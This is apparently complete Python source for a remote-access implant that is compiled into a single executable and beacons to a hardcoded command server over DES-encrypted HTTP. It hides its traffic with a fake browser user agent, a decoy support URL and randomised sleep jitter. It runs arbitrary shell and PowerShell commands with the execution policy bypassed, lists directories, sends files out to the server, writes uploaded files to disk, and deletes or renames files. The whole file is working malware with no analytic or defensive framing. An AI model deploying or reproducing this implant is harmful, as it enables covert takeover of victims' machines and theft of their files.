# pyinstaller --onefile HTTP_DES.py

import requests
import time
import random
import subprocess
import threading
import base64
from Crypto.Cipher import DES
import os
import json
from datetime import datetime

SERVER_IP = "192.168.1.107"
SERVER_PORT = 4444
SERVER_BASE = f"http://{SERVER_IP}:{SERVER_PORT}"

AUTH_ID = "b0c8793a-1e02-4073-9048-5533ea202d17"
KEY = "12345678"

DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

status_base64 = True
b64encode = base64.urlsafe_b64encode if status_base64 else base64.b64encode
b64decode = base64.urlsafe_b64decode if status_base64 else base64.b64decode

PREPEND_OUTPUT = ""
APPEND_OUTPUT = ""

GET_CLIENT_HEADERS = {}
POST_CLIENT_HEADERS = {}

class DESCipherHttp:
    def __init__(self, key):
        if isinstance(key, str):
            key = key.encode('utf-8')
        if len(key) != 8:
            raise ValueError("DES key must be exactly 8 bytes long")
        self.key = key
        self.block_size = 8

    def _pad(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        pad_len = self.block_size - len(data) % self.block_size
        return data + bytes([pad_len]) * pad_len

    def _unpad(self, data):
        pad_len = data[-1]
        return data[:-pad_len]

    def encrypt(self, raw_data):
        if isinstance(raw_data, str):
            raw_data = raw_data.encode('utf-8')
        raw_data = self._pad(raw_data)
        iv = os.urandom(8)
        cipher = DES.new(self.key, DES.MODE_CBC, iv)
        encrypted = cipher.encrypt(raw_data)
        return b64encode(iv + encrypted).decode('utf-8')

    def decrypt(self, enc_data):
        if isinstance(enc_data, str):
            enc_data = enc_data.encode('utf-8')
        try:
            enc_data = b64decode(enc_data)
        except:
            return ""
        if len(enc_data) < 8:
            return ""
        iv = enc_data[:8]
        encrypted = enc_data[8:]
        try:
            cipher = DES.new(self.key, DES.MODE_CBC, iv)
            decrypted = cipher.decrypt(encrypted)
            return self._unpad(decrypted).decode('utf-8', errors='replace')
        except:
            return ""

des = DESCipherHttp(KEY)

session_id = None
uris = ["/support/troubleshoot"]
current_user_agent = DEFAULT_USER_AGENT
sleep_time = 60.0
start_jitter = 0
end_jitter = 0

def get_url():
    return SERVER_BASE + random.choice(uris)

def get_request_headers(is_post=True):
    headers = {"User-Agent": current_user_agent}
    if is_post:
        headers["Content-Type"] = "application/json"
    headers.update(POST_CLIENT_HEADERS if is_post else GET_CLIENT_HEADERS)
    return {k: v for k, v in headers.items() if v}

def apply_jitter():
    global sleep_time, start_jitter, end_jitter
    if start_jitter > end_jitter:
        start_jitter, end_jitter = end_jitter, start_jitter
    jitter_amount = random.randint(start_jitter, end_jitter)
    final_sleep = sleep_time + jitter_amount
    final_sleep = max(10, min(900, final_sleep))
    time.sleep(final_sleep)

def parse_encrypted_headers(encrypted_str):
    if not encrypted_str:
        return {}
    plain_text = des.decrypt(encrypted_str)
    if not plain_text:
        return {}
    plain_text = plain_text.strip()
    if not plain_text:
        return {}
    headers_dict = {}
    for line in plain_text.splitlines():
        line = line.strip()
        if not line or ':' not in line:
            continue
        key, value = line.split(':', 1)
        headers_dict[key.strip()] = value.strip()
    return headers_dict

def checkin():
    global session_id, uris, current_user_agent, sleep_time, start_jitter, end_jitter
    global PREPEND_OUTPUT, APPEND_OUTPUT, GET_CLIENT_HEADERS, POST_CLIENT_HEADERS

    encrypted_token = des.encrypt(AUTH_ID)
    payload = {"action": "checkin", "token": encrypted_token}

    try:
        response = requests.post(
            get_url(),
            json=payload,
            headers=get_request_headers(is_post=True),
        )
        if response.status_code != 200:
            return False

        data = response.json()

        session_id = des.decrypt(data.get("sid", ""))
        if not session_id:
            return False

        current_user_agent = des.decrypt(data.get("ua", DEFAULT_USER_AGENT))
        start_jitter = int(des.decrypt(data.get("sj", "0")) or "0")
        end_jitter = int(des.decrypt(data.get("ej", "0")) or "0")
        sleep_time = float(des.decrypt(data.get("sl", "60")) or "60")

        uris_raw = data.get("ur", [])
        uris_dec = [des.decrypt(u) for u in uris_raw if des.decrypt(u)]
        if uris_dec:
            uris[:] = uris_dec

        PREPEND_OUTPUT = des.decrypt(data.get("pre", ""))
        APPEND_OUTPUT = des.decrypt(data.get("app", ""))

        get_enc = data.get("gh", "")
        post_enc = data.get("ph", "")

        GET_CLIENT_HEADERS.clear()
        GET_CLIENT_HEADERS.update(parse_encrypted_headers(get_enc))

        POST_CLIENT_HEADERS.clear()
        POST_CLIENT_HEADERS.update(parse_encrypted_headers(post_enc))

        if session_id:
            return True

    except:
        pass

    return False

def get_tasks():
    if not session_id:
        return None
    payload = {"action": "get_tasks", "sid": des.encrypt(session_id)}
    try:
        resp = requests.post(
            get_url(),
            json=payload,
            headers=get_request_headers(is_post=True),
        )
        if resp.status_code == 200:
            data = resp.json()
            if "command" in data and data["command"]:
                return des.decrypt(data["command"]).strip()
    except:
        pass
    return None

def submit_output(output):
    if not session_id:
        return

    encrypted = des.encrypt(output) or ""
    
    prepend = PREPEND_OUTPUT or ""
    append = APPEND_OUTPUT or ""
    
    final_output = prepend + encrypted + append
    
    payload = {
        "action": "submit",
        "sid": des.encrypt(session_id),
        "out": final_output
    }
    try:
        requests.post(
            get_url(),
            json=payload,
            headers=get_request_headers(is_post=True),
        )
    except:
        pass

def run_cmd_command(cmd):
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        output = result.stdout + result.stderr
        if result.returncode != 0:
            output += f"\n[Exit Code: {result.returncode}]"
        return output.strip() if output.strip() else "[+] Command executed (no output)"
    except subprocess.TimeoutExpired:
        return "[-] Command timed out after 90 seconds"
    except Exception as e:
        return f"[-] CMD execution error: {str(e)}"

def run_powershell_command(ps_cmd):
    try:
        result = subprocess.run(
            [
                "powershell.exe",
                "-NoProfile",
                "-ExecutionPolicy", "Bypass",
                "-Command", ps_cmd
            ],
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        output = result.stdout + result.stderr
        if result.returncode != 0:
            output += f"\n[Exit Code: {result.returncode}]"
        return output.strip() if output.strip() else "[+] PowerShell command executed (no output)"
    except subprocess.TimeoutExpired:
        return "[-] PowerShell command timed out after 120 seconds"
    except Exception as e:
        return f"[-] PowerShell execution error: {str(e)}"

def browse_directory(path):
    try:
        if path.startswith('~'):
            path = os.path.expanduser(path)     
        if not os.path.exists(path):
            return {'success': False,'error': f"Path does not exist: {path}",'current_path': path,'parent_path': None,'items': []}
        items = []
        try:
            entries = os.listdir(path)
        except PermissionError:
            return {'success': False,'error': f"Permission denied to access {path}",'current_path': path,'parent_path': None,'items': []}
        
        for item in entries:
            item_path = os.path.join(path, item)
            try:
                stat = os.stat(item_path)
                is_dir = os.path.isdir(item_path)
                modified_timestamp = stat.st_mtime
                modified_time = datetime.fromtimestamp(modified_timestamp).strftime('%Y-%m-%d %H:%M:%S')
                size_bytes = stat.st_size if not is_dir else 0    
                items.append({'name': item,'type': 'directory' if is_dir else 'file','size': size_bytes,'modified_time': modified_time})
            except (PermissionError, OSError):
                continue
        items.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
        parent_path = os.path.dirname(path)
        if path.endswith(':\\') or path == '/':
            parent_path = None
        elif parent_path == path:
            parent_path = None
        return {'success': True,'current_path': path,'parent_path': parent_path,'items': items}
    except Exception as e:
        return {'success': False,'error': str(e),'current_path': path,'parent_path': None,'items': []}

def download_file(filepath):
    try:
        if not os.path.exists(filepath):
            return f"ERROR: File not found: {filepath}"
        
        filesize = os.path.getsize(filepath)
        filename = os.path.basename(filepath)
        
        with open(filepath, 'rb') as f:
            file_data = f.read()
        
        file_data_b64 = base64.b64encode(file_data).decode('ascii')
        
        return f"file-data:{filename}|{filesize}|{file_data_b64}"
        
    except Exception as e:
        return f"ERROR: {str(e)}"

def upload_file(filepath, filedata_b64):
    try:
        file_data = base64.b64decode(filedata_b64)
        
        directory = os.path.dirname(filepath)
        if directory and not os.path.exists(directory):
            os.makedirs(directory)
        
        with open(filepath, 'wb') as f:
            f.write(file_data)
        
        return f"SUCCESS: File uploaded to {filepath}"
        
    except Exception as e:
        return f"ERROR: {str(e)}"

def delete_file(filepath):
    try:
        if os.path.isdir(filepath):
            os.rmdir(filepath)
        else:
            os.remove(filepath)
        return f"SUCCESS: Deleted {filepath}"
    except Exception as e:
        return f"ERROR: {str(e)}"

def rename_file(old_path, new_path):
    try:
        os.rename(old_path, new_path)
        return f"SUCCESS: Renamed to {new_path}"
    except Exception as e:
        return f"ERROR: {str(e)}"

def execute_command(cmd):
    cmd = (cmd or "").strip()
    if not cmd:
        return "[no command received]"

    if cmd.lower() == "ping":
        return "pong"
    
    if cmd.startswith("browse:"):
        browse_path = cmd[7:].strip()
        if not browse_path:
            browse_path = os.getcwd()
        dir_data = browse_directory(browse_path)
        json_str = json.dumps(dir_data, ensure_ascii=False)
        base64_data = base64.b64encode(json_str.encode('utf-8')).decode('ascii')
        return f"browse-data-{base64_data}"
    
    if cmd.startswith("download-file:"):
        filepath = cmd[14:].strip()
        result = download_file(filepath)
        return result
    
    if cmd.startswith("upload-file:"):
        parts = cmd[12:].split('|', 1)
        if len(parts) == 2:
            filepath, filedata_b64 = parts
            result = upload_file(filepath, filedata_b64)
            return result
        else:
            return b"ERROR: Invalid upload format"
    
    if cmd.startswith("delete-file:"):
        filepath = cmd[12:].strip()
        result = delete_file(filepath)
        return result
    
    if cmd.startswith("rename-file:"):
        parts = cmd[12:].split('|', 1)
        if len(parts) == 2:
            old_path, new_path = parts
            result = rename_file(old_path, new_path)
            return result
        else:
            return b"ERROR: Invalid rename format"
    
    upper = cmd.upper()
    if upper.startswith("EP "):
        return run_powershell_command(cmd[3:].strip())
    if upper.startswith("EP"):
        return run_powershell_command(cmd[2:].strip())
    return run_cmd_command(cmd)

def main_loop():
    while not session_id:
        if checkin():
            break
        time.sleep(random.uniform(15, 45))
    while True:
        try:
            command = get_tasks()
            if command and command.strip():
                result = execute_command(command)
                submit_output(result)
            else:
                pass
            apply_jitter()
        except KeyboardInterrupt:
            break
        except :
            time.sleep(random.randint(30, 120))

if __name__ == "__main__":
    main_loop()
